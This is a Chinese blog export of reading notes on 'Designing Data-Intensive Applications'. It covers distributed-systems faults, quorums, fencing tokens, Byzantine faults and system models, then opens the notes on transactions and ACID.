<p>设想一个具有<mark style="background: #FFF3A3A6;">非对称故障</mark>（asymmetric fault）的网络：某个节点可以<strong>收到</strong>任何其他节点发送给他的信息，但其<strong>发出</strong>的消息却被<strong>丢弃</strong>或者<strong>延迟很高</strong>。此时，尽管该节点运行良好，并且能处理请求，但却<mark style="background: #FFF3A3A6;">无人能收到其响应</mark>。在经过某个超时阈值后，其他节点由于收不到其消息，会将其标记为死亡。</p>
<p>打个比方，这种情况就像一个噩梦：处于半连接的节点就像躺在棺材里被运向墓地，尽管他持续大喊：“我没有死”，但没有人能听到他的喊声，葬礼继续。</p>
<p>第二个场景，稍微不那么噩梦一些，这个处于半连接的节点意识到了他发出去的消息别人收不到，进而推测出应该是网络出了问题。但纵然如此，该节点仍然被标记为死亡，而它也没有办法做任何事情来改变，但起码他<mark style="background: #FFF3A3A6;">自己能意识到这一点</mark>。</p>
<p>第三个场景，假设一个节点经历了长时间的 GC，该节点上的所有线程都被中断长达一分钟，此时任何发到该节点的请求都无法被处理，自然也就无法收到答复。其他节点经过等待、重试、失掉耐心进而最终标记该节点死亡，然后将其送进棺材板。经过漫长的一分钟后，终于，GC 完成，所有线程被唤醒从中断处继续执行。<strong>从该线程的角度来看，好像没有发生过任何事情</strong>。但是<mark style="background: #FFF3A3A6;">其他节点惊讶地发现棺材板压不住了，该节点坐起来了</mark>，恢复了健康，并且又开始跟旁边的人很开心的聊天了。</p>
<p>上述几个故事都表明，<mark style="background: #BBFABBA6;">任何节点都没法独自断言其自身当前状态</mark>。一个分布式系统不能有单点依赖，因为单个节点可能在任意时刻故障，进而导致整个系统卡住，甚而不能恢复。因此，大部分分布式算法会基于一个法定人数（quorum），即让所有节点进行投票：<strong><mark style="background: #FFF3A3A6;">任何决策都需要达到法定人数才能生效</mark>，以避免对单节点的依赖</strong>。</p>
<p>其中，前面故事中的宣布某个节点死亡就是这样一种决策。<mark style="background: #FFF3A3A6;">如果有达到法定个数的节点宣布某节点死亡，那他就会被标记为死亡</mark>。即使他还活着，也不得不服从系统决策而出局。</p>
<p>最普遍的情况是，<mark style="background: #BBFABBA6;">法定人数是集群中超过半数的节点，即多数派（其他比例的法定人数也有可能）</mark>。多数派系统允许少数节点宕机后，集群仍能继续工作（如三节点集群，可以容忍一个节点的故障；五节点集群，可以容忍两个节点故障）。并且在少数节点故障后，集群仍能安全地做出决策。因为在一个集群中，根据鸽巢原理，<mark style="background: #BBFABBA6;">系统中不可能有两个多数派做出不同的决策</mark>。</p>
<h4 id="领导者和锁">领导者和锁</h4>
<p>在很多场景下，系统会要求某些东西全局唯一，比如：</p>
<ol type="1">
<li>每个数据库分片都有唯一的领导者，避免脑裂</li>
<li>只有一个事务或者客户端允许持有某资源或者对象的锁，以避免并发写入或者删除</li>
<li>每个名字最多允许一个用户注册，因为需要用用户名来唯一标识一个用户</li>
</ol>
<p>在分布式系统中实现这种唯一性需要格外小心：尽管某个节点<strong>自认为</strong>它是那个 “唯一被选中的（The chosen one）”（分区的主副本、锁的持有者、成功处理用户名注册请求的节点），<mark style="background: #FFF3A3A6;">这并不意味着法定数目的（Quorum）节点也都如此认为</mark>！可能一个节点以前是领导者，但在其领导期间，如果其他节点都认为它死了（可能由于网络故障或者 GC 停顿），它就有可能被降级，且其他节点被选举上位。</p>
<p>当大多数节点认为前领导者死亡时，该节点仍然<strong>自顾自的行使领导权</strong>，在设计的不太好的系统中，就会带来一些问题。这样的前领导节点可能会给其他节点发送一些错误决策的消息，如果其他节点相信且接受了这些消息，系统在整体层面可能就会做出一些错误的事情。</p>
<p>图 8-4 展示了一个由错误实现的锁导致的<strong>数据损坏</strong>（data corruption）的 Bug（这个 Bug 并存在于纯理论上，HBase 曾经就有这个 Bug）。假设你想保证在任意时刻，存储服务上的文件最多只能被一个客户端访问，以避免多个客户端并发修改时损坏数据。具体到实现上，你想让客户端在访问文件时，先从锁服务获取一个租约：</p>
<p>前面小节 “进程停顿” 中其实讲到了这么做会导致的问题：如果持有租约的客户端<mark style="background: #FF5582A6;">停顿了过长时间，以至于租约过期</mark>。此时，另外一个客户端向锁服务请求并获取到同一个文件的租约，然后开始写文件。当前一个停顿的客户端恢复时，它想当然的认为自己仍然持有租约，也开始写文件。此时，这两个客户端的写入可能会产生冲突并导致文件的数据损坏。</p>
<p><img src="ch08-fig04.png"> <strong>图 8-4 分布式锁的实现不正确：客户端 1 认为它仍然具有有效的租约，即使它已经过期，从而破坏了存储中的文件</strong></p>
<h4 id="防护令牌fencing-tokens">防护令牌（fencing tokens）</h4>
<p>当使用锁或租期来保护对某些资源的互斥访问时，需要确保那些错误的认为自己是 “被选中的人”（比如主副本、持有锁等）不能影响系统其他部分。此问题一个简单的解决方法是，使用<strong>防护</strong>（fencing），如下图所示：</p>
<p><img src="ch08-fig05.png"> <strong>图 8-5 只允许以增加防护令牌的顺序进行写操作，从而保证存储安全</strong></p>
<p>在锁服务每次授予锁或者租约时，会附带给一个<strong>防护令牌</strong>（fencing token）：</p>
<ul>
<li>防护令牌其实就是一个单调递增数字，锁服务在每次锁被授予时，对其进行加一</li>
<li>当存储服务每次收到客户端的请求时，都会要求出示该令牌</li>
</ul>
<p>如上图，客户端 1 获得了一个关联了令牌号 33 的租期，但随即经历了长时间的停顿，然后租约过期。客户端 2 获得了一个关联令牌号 34 的租期，并且向存储服务发送了一个附带了该令牌号的写请求。稍后，当客户端 1 结束停顿时，附带令牌号 33，给存储服务发送写请求。然而，<mark style="background: #BBFABBA6;">由于存储服务记下了它<strong>处理过更高令牌号</strong>（34）的请求，于是它就会拒绝该使用令牌号 33 的请求</mark>。</p>
<ul>
<li>如果我们使用 ZooKeeper 作为锁服务，那么事务 ID zxid 或者节点版本 cversion 可以用于防护令牌。因为他们单调递增，符合需求。</li>
<li>个人理解，<mark style="background: #FFF3A3A6;">Raft 协议中的任期，也可以理解为防护令牌</mark></li>
</ul>
<p>注意到，该机制<mark style="background: #FFF3A3A6;">要求资源服务自己可以<strong>主动拒绝</strong>使用过期版本令牌的写请求</mark>，也就是说，仅依赖客户端对锁状态进行自检是不够的。对于那些不能<strong>显式支持</strong>防护令牌检查的资源服务来说，我们仍然可以有一些变通手段（work around，如在写入时将令牌号写到文件路径中），总之，引入一些检查手段是必要的，以避免在锁的保护外执行请求。</p>
<p>这也是某种程度上的<em>真相由多数决定</em>：<strong>客户端不能独自确定其对资源的独占性</strong>。需要在服务端对所有客户端的情况做一个二次核验。</p>
<p>在服务端检查令牌也并不是缺点：<strong>默认所有客户端都是遵纪守法的并不明智，因为运行客户端的人和运行服务的人具有完全不同的优先考虑点</strong>。因此，我们<mark style="background: #BBFABBA6;">最好在服务端做好防护，使其免受不良客户端的滥用甚至攻击</mark>。</p>
<h3 id="拜占庭错误">拜占庭错误</h3>
<p>防护令牌只能检测并阻止<strong>无意</strong>（<em>inadvertently，如不知道自己租约过期了</em>）中犯错的客户端。但<mark style="background: #FF5582A6;">如果某个客户端节点有意想打破系统约定，可以通过<strong>伪造</strong>防护令牌来轻易做到</mark>。</p>
<p><mark style="background: #FFF3A3A6;">在本书中我们假设所有参与系统的节点可能不可靠</mark>（unreliable）、但<mark style="background: #BBFABBA6;">一定是诚实的</mark>（honest）：</p>
<ul>
<li>这些节点有可能反应较慢甚至没有响应（由于故障），他们的状态可能会过期（由于 GC 停顿或者网络延迟）</li>
<li>但一旦节点响应，“说的都是真话”：<strong>在其认知范围内，尽可能的遵守协议进行响应</strong></li>
</ul>
<p><mark style="background: #FFF3A3A6;">如果系统中的节点有 “说谎”（发送任意错误的的或者损坏的信息）的可能性，分布式系统将会变得十分复杂</mark>。如，一个节点没有收到某条消息却声称收到了。这种行为称为<strong>拜占庭故障</strong>（Byzantine fault），在具有拜占庭故障的环境中达成共识也被称为<strong>拜占庭将军问题</strong>（Byzatine Generals Problem）。</p>
<blockquote>
<p><strong>拜占庭将军问题</strong></p>
<p>拜占庭将军问题是<strong>两将军问题</strong>（Two Generals Problem）的<strong>泛化</strong>。两将军问题设想了一个需要达成作战计划的战争场景。有两支军队，驻扎在两个不同的地方，只能通过信使来交换信息，但信使有时候会迟到甚至迷路（如网络中的数据包）。第九章会详细讨论这个问题。</p>
<p>在该问题的拜占庭版本，有 n 个将军，但由于中间出了一些叛徒，他们想达成共识更具难度。但大部分将军仍然是忠诚的，并且会送出真实的消息；与此同时，叛徒会试图通过送出假的或者失实的消息来欺骗和混淆其他人（同时保持隐蔽）。大家事先都不知道谁是叛徒。</p>
<p>拜占庭是一个古希腊城市，后来罗马皇帝君士坦丁在此建立新都，称为 “新罗马”，但后人普遍被以建立者之名称作君士坦丁堡，现在是土耳其的伊斯坦布尔。当然，没有任何历史证据表明拜占庭的将军比其他地方更多地使用阴谋诡计。相反，这个名字是来自于拜占庭本身，在计算机出现很久之前，Byzantine 就有极度复杂、官僚主义、狡猾多变等含义。Lamport 想选一个不会冒犯任何读者的城市，比如，有人提醒他_阿尔巴尼亚将军问题_就不是一个好名字。</p>
</blockquote>
<p>如果有一些节点发生故障且不遵守协议，或者恶意攻击者正在扰乱网络，一个系统仍能正确运行，则该系统是<strong>拜占庭容错的</strong>（<em>Byzantine fault-tolerant</em>）。举几个相关的场景例子：</p>
<ul>
<li>在航天环境中，由于<strong><mark style="background: #FF5582A6;">高辐射环境</mark></strong>的存在，计算机内存或者寄存器中的<mark style="background: #FF5582A6;">数据可能会损坏，进而以任意不可预料的方式响应其他节点的请求</mark>。在这种场景下，系统故障代价会非常高昂（如：太空飞船坠毁并致使所有承载人员死亡，或者火箭装上国际空间站），因此<strong>飞控系统</strong>必须容忍拜占庭故障。</li>
<li>在一个有<strong>多方组织</strong>参与的系统中，有些参与方可能会尝试作弊或者欺骗别人。在这种环境中，由于恶意消息发送方的存在，无脑的相信其他节点的消息是不安全的。如，类似比特币或者其他区块链的 p2p 网络，就是一种让没有互信基础的多方，在不依赖<strong>中央权威</strong>的情况下，就某个交易达成共识的一种方法。</li>
</ul>
<p>当然，对于本书中讨论的大部分系统，我们都可以<strong>假设不存在拜占庭故障</strong>。因为，在你的数据中心里，所有的节点都是受你所在的组织控制的（因此大概率是可信的，除非受攻击变成了肉机），并且辐射水平足够低，因此内存受辐射损坏的概率也微乎其微。此外，<mark style="background: #FFF3A3A6;">让系统能够进行拜占庭容错的协议复杂度非常高</mark>，且嵌入式系统的容错依赖于硬件层面的支持。因此，<mark style="background: #FFF3A3A6;">在绝大多数服务端的数据系统中，使用拜占庭容错的解决方案都是不现实的</mark>。</p>
<p>Web 应用确实可能遇到由任意终端用户控制的客户端（如浏览器）发送来的任意的，甚至是恶意的请求。这也是为啥输入校验、过滤和输出转义如此重要 —— 如可以防止&nbsp;<strong>SQL 注入</strong>和<strong>跨域攻击</strong>（SQL injection and crosssite scripting）<strong>。然而，我们在此时通常不会使用拜占庭容错的协议，而是简单地让服务端来决定用户输入是否合法。在</strong>没有中心权威 ** 的 p2p 网络中，才更加需要拜占庭容错。</p>
<p>当然，从某种角度来说，服务实例中的 bug 也可以被认为是拜占庭故障。但如果你将具有该 bug 的软件部署到了所有节点中，拜占庭容错的算法也无能为力。因为<mark style="background: #FFF3A3A6;">大多数拜占庭容错的算法要求超过三分之二的绝大多数的节点都是正常运行的</mark>（如系统中有四个节点，则最多允许有一个恶意节点）。如果想使用拜占庭容错算法来避免故障，你需要四个节点部署有四种独立实现，但提供同样功能的软件，并且 bug 最多只存在于其中的一种实现中。</p>
<p>类似的，如果某种拜占庭容错的协议能够让我们免于漏洞、安全渗透和恶意攻击，那他会相当具有吸引力。但不幸，这也是不现实的，在大多数系统中，由于系统<strong>不同节点所运行软件的同构性</strong>，<mark style="background: #FF5582A6;">如果攻击者能够拿下一个节点，那他大概率能拿下所有节点</mark>。因此，一些传统的中心防护机制（认证鉴权、访问控制、加密、防火墙等等）仍是让我们免于攻击的主要手段。</p>
<h4 id="弱谎言">弱谎言</h4>
<p>即使我们通常假设节点是诚实的，但为软件加上一些对<strong>弱谎言</strong>（week forms of lying）的简单防护机制仍然很有用，例如由于硬件故障、软件 bug、错误配置等问题，一些节点可能会发送非法消息。由于不能挡住有预谋对手的蓄意攻击，这种防护机制不是完全的的拜占庭容错的，但却是一种简单有效的获取更好可用性的方法。例如：</p>
<ul>
<li><mark style="background: #FFF3A3A6;">校验码</mark>：由于操作系统、硬件驱动、路由器中的 bug，网络中的数据包有时会损坏。通常来说，TCP 或者 UDP 协议中内置的<mark style="background: #BBFABBA6;">校验和机制</mark>会检测到这些损坏的数据包，但有时他们也会逃脱检测。使用一些很简单的手段就能挡住这些损坏的数据包，如<strong>应用层的校验字段</strong>。</li>
<li><mark style="background: #FFF3A3A6;">参数检查</mark>：可公开访问的应用需要<strong>仔细地过滤</strong>任何来自用户的输入，如检查输入值是否在合理的范围内、限制字符串长度，以避免过量内存分配造成的拒绝服务攻击。防火墙内部的服务可以适当放宽检查，但（如在协议解析时）一些基本的合法性检查仍是十分推荐的。</li>
<li><mark style="background: #FFF3A3A6;">时钟同步</mark>：可以为 NTP 客户端配置<strong>多个 NTP 服务源</strong>。当进行时钟同步时，客户端会向所有源发送请求，估算误差，以判断是否绝大多数源提供的时间会落在同一个时间窗口内。只要大部分 NTP 服务器正常运行，<mark style="background: #BBFABBA6;">一两个提供错误时间的 NTP 服务器就会被检测出来，并被排除在外</mark>。从而，使用多个服务器让 NTP 同步比使用单个服务器更加健壮。</li>
</ul>
<h3 id="系统模型和现实">系统模型和现实</h3>
<p>前人已经设计了很多算法以解决分布式系统的的问题，如我们将要在第九章讨论的共识问题的一些解决方案。这些算法需要能够处理本章提到的各种问题，才能够在实际环境用有用。</p>
<p>在设计算法的时候，不能过重的依赖硬件的细节和软件的配置，这迫使我们对系统中可能遇到的问题进行<strong>抽象化处理</strong>。我们的解决办法是定义一个<strong>系统模型</strong>（system model），以对算法的期望会遇到的问题进行抽象。</p>
<p>对于时间的假设，有三种系统模型很常用：</p>
<ol type="1">
<li><strong>同步模型（synchronous model）</strong>。这种模型假设<strong>网络延迟</strong>、<strong>进程停顿</strong>和<strong>时钟错误</strong>都是<strong>有界</strong>的。但这不是说，时钟是完全同步的、网络完全没有延迟，只是说我们知道上述问题永远不会超过一个上界。但当然，这不是一个现实中的模型，因为在实践中，无界延迟和停顿都会实实在在的发生。</li>
<li><strong>半同步模型（partial synchronous）</strong>。意思是在大多数情况下，网络延迟、进程停顿和时钟漂移都是有界的，只有偶尔，他们会超过界限。这是一种比较真实的模型，即在<strong>大部分时间里</strong>，系统中的网络和进程都表现良好，否则我们不可能完成任何事情。但与此同时，我们必须要记着，任何关于时限的假设都有可能被打破。且一旦出现出现异常现象，我们需要做好最坏的打算：网络延迟、进程停顿和时钟错误都有可能错得非常离谱。</li>
<li><strong>异步模型（Asynchronous model）</strong>。在这种模型里，算法不能对时间有任何假设，甚至时钟本身都有可能不存在（在这种情况下，超时间隔根本没有意义）。有些算法可能会针对这种场景进行设计，但很少很少。</li>
</ol>
<p>除时间问题，我们还需要对节点故障进行抽象。针对节点，有三种最常用的系统模型：</p>
<ol type="1">
<li><strong>宕机停止故障（Crash-stop faults）</strong>。节点只会通过崩溃的方式宕机，即某个时刻可能会突然宕机无响应，并且之后永远不会再上线。</li>
<li><strong>宕机恢复故障（Crash-recovery faults）</strong>。节点可能会在任意时刻宕机，但在宕机之后某个时刻会重新上线，但恢复所需时间我们是不知道的。在此模型中，我们假设节点的稳定存储中的数据在宕机前后不会丢失，但内存中的数据会丢失。</li>
<li><strong>拜占庭（任意）故障（Byzantine (arbitrary) faults）</strong>。我们不能对节点有任何假设，包括宕机和恢复时间，包括善意和恶意，前面小节已经详细讨论过了这种情形。</li>
</ol>
<p><mark style="background: #BBFABBA6;">对于真实世界，半同步模型和宕机恢复故障是较为普遍的建模</mark>，那我们又要如何设计算法来应对这两种模型呢？</p>
<h4 id="算法的正确性">算法的正确性</h4>
<p>我们可以通过描述算法<strong>需要满足的性质</strong>，来定义其正确性。举个例子，排序算法的输出满足特性：<em>任取结果列表中的两个元素，左边的都比右边的小</em>。这是一种简单的对列表有序的形式化定义。</p>
<p>类似的，我们可以给出描述分布式算法的正确性的一些性质。如，我们想通过产生防护令牌的方式来上锁，则我们期望该算法具有以下性质：</p>
<ol type="1">
<li><strong>唯一性（uniqueness）</strong>。两个不同请求不可能获得具有相同值的防护令牌。</li>
<li><strong>单调有序性（monotonic sequence）</strong>。设请求 x 获取到令牌 tx，请求 y 获取到令牌 ty，且 x 在 y 之前完成，则由 tx &lt; ty。</li>
<li><strong>可用性（availability）</strong>。如果某永不宕机节点请求一个防护令牌，则其最终会收到响应。</li>
</ol>
<p>在某种系统模型下，如果一个算法能够应对该模型下的所有可能出现的情况，并且时刻满足其<strong>约束性质</strong>，则我们称该算法是<strong>正确</strong>的。但当然，如果所有节点都宕机了、或网络延迟变得无限长，那么没有任何算法可以正常运作。</p>
<h4 id="安全性和存活性">安全性和存活性</h4>
<p>为了进一步弄清状况，我们需要进一步区分<strong>两类</strong>不同的属性：<strong>安全性</strong>（safety）和<strong>存活性</strong>（liveness）。在上面的例子中，唯一性和单调有序性属于安全性，但可用性属于存活性。</p>
<p>那如何区分这两者呢？一个简单的方法是，<mark style="background: #FFF3A3A6;">在描述存活性的属性的定义里总会包含单词：“<strong>最终</strong>（eventually）”</mark>，对，我知道你想说什么，<strong>最终一致性</strong>（eventually）也是一个存活性属性。</p>
<p>安全性，通俗的可以理解为<strong>没有坏事发生</strong>（nothing bad happens）；而存活性可以理解为<strong>好的事情最终发生了</strong>（something good eventually happens），但也不要对这些非正式定义太过咬文嚼字，因为所谓的 “好” 和 “坏” 都是相对的。安全性和存活性的严格定义都是精确且数学化的：</p>
<ul>
<li><mark style="background: #FFF3A3A6;">如果违反了安全性，一定可以找到一个其被破坏的具体时间点</mark>。（如，对于防护令牌算法，如果违反了唯一性，则一定有个某个请求，返回了重复的令牌）一旦违反了安全性，造成的破坏不能被恢复，即破坏是永久的。</li>
<li><mark style="background: #BBFABBA6;">存活性</mark>正好相反，可能在某个时刻不满足（如某节点发出请求，但还没有被收到），但是<mark style="background: #BBFABBA6;">在将来时刻总会被满足</mark>（即最终会收到消息）。</li>
</ul>
<p>区分安全性和存活性的意义在于，我们可以处理一些复杂的系统模型。对于分布式系统算法，我们通常会比较关注安全性，<mark style="background: #BBFABBA6;">在系统模型可能触到的各种情况下，安全性都必须满足</mark>。即，即使最不利的情况，所有节点都宕机、整个网络都瘫痪，算法也必须要保证安全，不能返回错误结果。</p>
<p>相反，对于存活性来说，我们放宽一些：如我们会说一个请求只有在大多数节点存活、网络最终通畅的情况下才会最终收到请求。半同步模型的定义其实蕴含着，它最终会回到同步状态，即，网络中断只会持续有限时间，终将被修复。</p>
<h4 id="将系统模型映射到真实世界">将系统模型映射到真实世界</h4>
<p>在衡量分布式系统算法时，安全性、存活性和系统模型都是很有用的工具。但我们在真实世界里去实现一个实际的系统时，无数烦人的细节又都会浮现出来，时刻提醒你，系统模型终究只是对现实一种理想的简化。</p>
<p>如，<strong>宕机恢复模型</strong>一般会假设数据存在稳定存储上，在多次宕机重启后不会丢失。但在实践中，如果磁盘数据损坏怎么办？如果固件有 bug 导致重启时无法识别磁盘驱动怎么办？</p>
<p>Quorum 算法多要求每个节点记住其所声明的内容。如果由于某个节点有 “健忘症”，忘记了之前存的数据，就会打破 Quorum 算法的假设，从而破坏该算法的正确性。在这种情况下，我们可能需要一种新的系统模型，能允许节点在宕机重启时偶尔忘点东西，但我们难以推演基于这种模型算法的正确性。</p>
<p>我们在对算法进行理论描述的时候，可以假设一些事情不会发生。比如，在非拜占庭系统中，我们假设对哪些故障会发生、哪些不会做了假设。<mark style="background: #FFF3A3A6;">但在系统实现的代码中，我们通常也会保留处理这些极端情况的代码</mark>，哪怕处理的很简单，比如打印一些文字：<code>printf("Sucks to be you")</code>&nbsp;或者使用某个错误号来退出&nbsp;<code>exit(666)</code>，然后让运维人员来做进一步排查（这种区别也是计算机科学和软件工程的不同之处）。</p>
<p>但这并不是说，理论的、抽象的系统模型毫无价值。事实上，恰恰相反，它能帮助我们将复杂真实的系统，<strong>提炼</strong>为可处理、可推演的<strong>有限故障集</strong>。据此，我们可以剖析问题，并进行系统性地解决问题。在特定的系统模型下，只要算法满足特定性质，我们就可以<strong>证明算法的正确性。</strong></p>
<p><mark style="background: #FFF3A3A6;">即使算法被证明是正确的，但在实际环境中，其实现并不一定总能够正确运行</mark>。不过，这已经是一个很好的开端了，系统的分析能够很快地暴露算法的问题。而在真实系统中，这些问题只有经过很长时间、当你的假设被某些极端情况打破后才可能发现。<strong>理论分析</strong>（Theoretical analysis）和<strong>实践测试</strong>（empirical testing）需要并重。</p>
<h2 id="本章小结">本章小结</h2>
<p>在本章中，我们讨论了分布式系统中可能发生的各种问题，包括：</p>
<ul>
<li>当你尝试通过网络发送数据包时，<mark style="background: #FFF3A3A6;">数据包可能会丢失或任意延迟</mark>。同样，答复可能会丢失或延迟，所以如果你没有得到答复，你不知道消息是否发送成功了。</li>
<li><mark style="background: #FFF3A3A6;">节点的时钟可能会与其他节点显著不同步</mark>（尽管你尽最大努力设置 NTP），它可能会突然跳转或跳回，依靠它是很危险的，因为你很可能没有好的方法来测量你的时钟的错误间隔。</li>
<li><mark style="background: #FFF3A3A6;">一个进程可能会在其执行的任何时候暂停一段相当长的时间</mark>（可能是因为停止所有处理的垃圾收集器），被其他节点宣告死亡，然后再次复活，却没有意识到它被暂停了。</li>
</ul>
<p>这类&nbsp;<strong><mark style="background: #FFF3A3A6;">部分失效（partial failure）</mark></strong>&nbsp;可能发生的事实<mark style="background: #FFF3A3A6;">是分布式系统的决定性特征</mark>。每当软件试图做任何涉及其他节点的事情时，偶尔就有可能会失败，或者随机变慢，或者根本没有响应（最终超时）。在分布式系统中，我们试图在软件中建立&nbsp;<strong>部分失效</strong>&nbsp;的容错机制，这样整个系统在即使某些组成部分被破坏的情况下，也可以继续运行。</p>
<p>为了容忍错误，第一步是&nbsp;<strong>检测</strong>&nbsp;它们，但即使这样也很难。大多数系统没有检测节点是否发生故障的准确机制，所以<mark style="background: #BBFABBA6;">大多数分布式算法依靠&nbsp;<strong>超时</strong>&nbsp;来确定远程节点是否仍然可用</mark>。但是，超时无法区分网络失效和节点失效，并且可变的网络延迟有时会导致节点被错误地怀疑发生故障。此外，有时一个节点可能处于降级状态：例如，由于驱动程序错误，千兆网卡可能突然下降到 1 Kb/s 的吞吐量【94】。这样一个 “跛行” 而不是死掉的节点可能比一个干净的失效节点更难处理。</p>
<p>一旦检测到故障，使系统容忍它也并不容易：没有全局变量，没有共享内存，没有共同的知识，或机器之间任何其他种类的共享状态。节点甚至不能就现在是什么时间达成一致，就不用说更深奥的了。信息从一个节点流向另一个节点的唯一方法是通过不可靠的网络发送信息。<mark style="background: #FFF3A3A6;">重大决策不能由一个节点安全地完成</mark>，因此我们需要一个能从其他节点获得帮助的协议，并<mark style="background: #FFF3A3A6;">争取达到法定人数以达成一致</mark>。</p>
<p>如果你习惯于在理想化的数学完美的单机环境（同一个操作总能确定地返回相同的结果）中编写软件，那么转向分布式系统的凌乱的物理现实可能会有些令人震惊。相反，<mark style="background: #BBFABBA6;">如果能够在单台计算机上解决一个问题</mark>，那么分布式系统工程师通常会认为这个问题是平凡的，现在单个计算机确实可以做很多事情。如果你可以避免打开潘多拉的盒子，把东西放在一台机器上，那么<mark style="background: #BBFABBA6;">通常是值得的</mark>。</p>
<p>但是，可伸缩性并不是使用分布式系统的唯一原因。容错和低延迟（通过将数据放置在距离用户较近的地方）是同等重要的目标，而这些不能用单个节点实现。</p>
<p>在本章中，我们也转换了几次话题，探讨了网络、时钟和进程的不可靠性是否是不可避免的自然规律。我们看到这并不是：有可能给网络提供硬实时的响应保证和有限的延迟，但是这样做非常昂贵，且导致硬件资源的利用率降低。<mark style="background: #FFF3A3A6;">大多数非安全关键系统会选择&nbsp;便宜而不可靠，而不是&nbsp;昂贵和可靠</mark>。</p>
<p>我们还谈到了超级计算机，它们采用可靠的组件，因此当组件发生故障时必须完全停止并重新启动。相比之下，分布式系统可以永久运行而不会在服务层面中断，因为所有的错误和维护都可以在节点级别进行处理 —— 至少在理论上是如此。 （实际上，如果一个错误的配置变更被应用到所有的节点，仍然会使分布式系统瘫痪）。</p>
<p>本章一直在讲存在的问题，给我们展现了一幅黯淡的前景。在&nbsp;下一章&nbsp;中，我们将继续讨论解决方案，并讨论一些旨在解决分布式系统中所有问题的算法。</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://ddia.qtmuniao.com/#/ch08">第八章：分布式系统中的麻烦事 (qtmuniao.com)</a></li>
<li><a href="http://ddia.vonng.com/#/ch8">第八章：分布式系统的麻烦 (vonng.com)</a></li>
</ul>
]]></content>
      <categories>
        <category>阅读</category>
        <category>后端</category>
        <category>DDIA</category>
      </categories>
      <tags>
        <tag>DDIA</tag>
        <tag>设计数据密集型应用</tag>
        <tag>分布式系统</tag>
      </tags>
  </entry>
  <entry>
    <title>DDIA 阅读笔记第七章：事务</title>
    <url>/blog/2024/05/19/DDIA-Note-7/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本章围绕事务这一主题，介绍了事务的含义、强弱隔离级别的实现，以及解决的并发问题。</p>
<span id="more"></span>
<h2 id="简介">简介</h2>
<p>在数据系统中，很多事情都可能出错：</p>
<ul>
<li>数据库：数据库软硬件可能随时发生故障（包括写操作进行到一半时）。</li>
<li>应用：应用程序可能随时崩溃（包括一系列操作的中间）。</li>
<li>网络：网络中断可能会意外切断数据库与应用的连接，或数据库之间的连接。</li>
<li>客户端并发：多个客户端可能会同时写入数据库，覆盖彼此的更改。
<ul>
<li>客户端可能读取到无意义的数据，因为数据只更新了一部分。</li>
<li>客户之间的竞争条件可能导致奇怪的错误。</li>
</ul></li>
</ul>
<p>如果每个应用程序都要处理这些问题，负担很重。为了<strong>简化应用编程模型</strong>&nbsp;，数据库提供了事务（transaction）机制。使用事务，<mark style="background: #FFF3A3A6;">应用程序可以将多个读写操作组合成一个逻辑单元</mark>。从概念上讲，事务中的所有读写操作被视作单个操作来执行：</p>
<ul>
<li>整个事务要么成功 &nbsp;<strong>提交</strong>（commit），要么失败：<strong>中止</strong>（abort）或 &nbsp;<strong>回滚</strong>（rollback）。</li>
<li><mark style="background: #BBFABBA6;">如果失败，应用程序可以安全地重试</mark>。</li>
</ul>
<p>通过使用事务，应用程序可以忽略某些潜在的错误情况和并发问题，因为数据库会替应用处理好这些。（称之为 &nbsp;<strong>安全保证</strong>，即 safety guarantees）。</p>
<p>事务是有代价的，并不是所有的应用都需要事务：</p>
<ul>
<li>有时候弱化事务保证、或完全放弃事务也是有好处的（例如，为了获得更高性能或更高可用性）</li>
<li>一些安全属性也可以在没有事务的情况下实现。</li>
</ul>
<p>本章将研究许多出错案例，并探索数据库用于防范这些问题的算法。尤其会深入 &nbsp;<strong>并发控制</strong>&nbsp; 的领域，讨论各种可能发生的竞争条件，以及数据库如何实现常用的隔离级别：</p>
<ul>
<li><strong>读已提交（read committed）</strong></li>
<li><strong>快照隔离（snapshot isolation）</strong>，也称为可重复读（repeatable read）</li>
<li>** 可串行化（serializability）</li>
</ul>
<p>本章同时适用于单机数据库与分布式数据库，在 &nbsp;<strong>第八章</strong>&nbsp; 中将重点讨论仅出现在分布式系统中的特殊挑战。</p>
<h2 id="事务的棘手概念"><strong>事务的棘手概念</strong></h2>
<p>现今，几乎所有的关系型数据库和一些非关系数据库都支持 &nbsp;<strong>事务</strong>。其中大多数遵循 IBM System R（第一个 SQL 数据库）在 1975 年引入的风格【1,2,3】。40 年里，尽管一些实现细节发生了变化，但总体思路大同小异：MySQL、PostgreSQL、Oracle 和 SQL Server 等数据库中的事务支持与 System R 异乎寻常地相似。</p>
<h3 id="acid-的含义"><strong>ACID 的含义</strong></h3>
<p>事务所提供的安全保证，通常由首字母缩略词 ACID 来描述：</p>
<ul>
<li><strong>原子性（Atomicity）</strong>：如果在一系列写操作的中途发生错误，则中止事务，并丢弃当前事务的所有写入。换句话说，<mark style="background: #BBFABBA6;">免去用户对部分失败的担忧</mark> —— 提供 “<strong>all-or-nothing</strong>” 的保证。</li>
<li><strong>一致性（Consistency）</strong>：应用程序可基于数据库提供的原子性、隔离性保证，定义并维护数据库的一致性。</li>
<li><strong>隔离性（Isolation）</strong>：<mark style="background: #BBFABBA6;">同时运行的事务不会互相干扰</mark>。例如，如果一个事务进行多次写入，则另一个事务<strong>要么看到全部写入结果，要么什么都看不到</strong>，但不能看到中间状态。</li>
<li><strong>持久性（Durability）</strong>：事务一旦提交，不会丢失。</li>
</ul>
<p>这些是旨在为数据库中的容错机制建立精确的术语。</p>
<p>但实际上，不同数据库的 ACID 实现并不相同。例如，围绕着<strong>隔离性（Isolation）</strong>&nbsp; 的含义有许多含糊不清。</p>
<ul>
<li>高层次上的想法是合理的，但魔鬼隐藏在细节里。</li>
<li>今天，当一个系统声称自己 “符合 ACID” 时，实际上能期待的是什么保证并不清楚。不幸的是，<mark style="background: #FFF3A3A6;">ACID 现在几乎已经变成了一个<strong>营销术语</strong></mark>。</li>
</ul>
<p>不符合 ACID 标准的系统有时被称为 BASE，它代表：</p>
<ul>
<li><strong>基本可用性（Basically Available）</strong></li>
<li><strong>软状态（Soft State）</strong></li>
<li><strong>最终一致性（Eventual consistency）</strong></li>
</ul>
<p>BASE 比 ACID 的定义更加模糊，<mark style="background: #BBFABBA6;">似乎 BASE 的唯一合理的定义是 “不是 ACID”</mark>，即它几乎可以代表任何你想要的东西。</p>
<h4 id="原子性atomicity"><strong>原子性（Atomicity）</strong></h4>
<p>一般来说，原子是指不能分解成小部分的东西。这个词在计算的不同分支中意味着相似但又微妙不同的东西。</p>
<ul>
